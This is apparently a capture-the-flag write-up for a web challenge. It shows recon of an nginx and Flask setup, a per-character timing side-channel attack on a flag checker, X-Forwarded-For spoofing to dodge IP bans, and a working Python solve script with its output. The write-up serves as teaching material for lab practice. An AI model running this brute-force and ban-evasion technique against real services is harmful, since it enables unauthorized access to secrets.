- Enum reveals `nginx` is on port 80
- Header `X-Response-Time` present -> Timing -> Side Channel Timing Attack?
- `nginx` seems to rate limit, returns almost instant response, probably not be the timing we need
- IP will get banned after multiple attempts but we can randomize IP to bypass via `X-Forwarded-For` header
- That timing must be from frontend, not the actual flag checking logic -> no noticeable time diff while guessing
- Webapps are usually Flask with default port 5000
- Visit `http://IP:5000` **OR** `curl IP:5000` **OR** `nmap` will reveal it is open
- Wappalyzer extension confirms Flask is running
- Testing this endpoint we find a different base timing of ~0.5s using `flag{` since we already know the flag format

```
Port 80 (nginx):
  0.000102
  0.000102
  0.000099
  0.000095
  0.000133

Port 5000 (Flask):
  0.501980
  0.501861
  0.502390
  0.501717
  0.501887
```

- We can see increase in time ~0.1s on correct char guesses

```
Wrong char: 0.501717s
Right char: 0.601931s
```

- Put it all together and we can brute the flag

## solve.py

- `python solve.py <IP>`

```python
#!/usr/bin/env python3
from pwn import *
import requests
from concurrent.futures import ThreadPoolExecutor
import sys

context.log_level = 'info'

if len(sys.argv) != 2:
    log.error("Usage: %s <IP>" % sys.argv[0])
    sys.exit(1)

ip = sys.argv[1]
url = f"http://{ip}:5000/submit"
known = ""

def test_char(args):
    position, known, char = args
    test = f"flag{{{known}{char}{'0'*(31-position)}}}"
    headers = {"X-Forwarded-For": f"1.{position}.2.{ord(char)}"}

    r = requests.get(url, params={"flag": test}, headers=headers, timeout=10)
    time_val = float(r.headers.get('X-Response-Time', '0'))
    return char, time_val

log.info("Target: %s" % url)
log.info("Method: Timing side-channel attack (+0.1s per correct char)")

with log.progress("Extracting flag") as p:
    for position in range(32):
        p.status(f"[{position+1:2d}/32] flag{{{known}...}}")

        with ThreadPoolExecutor(max_workers=16) as executor:
            results = list(executor.map(test_char, [(position, known, c) for c in "0123456789abcdef"]))

        best_char, best_time = max(results, key=lambda x: x[1])
        known += best_char

        p.status(f"[{position+1:2d}/32] flag{{{known}}}")

log.success(f"flag{{{known}}}")
```

```sh
$ python solve.py 10.1.176.252
[*] Target: http://10.1.176.252:5000/submit
[*] Method: Timing side-channel attack (+0.1s per correct char)
[+] Extracting flag: Done
[+] flag{77ba0346d9565e77344b9fe40ecf1369}
```
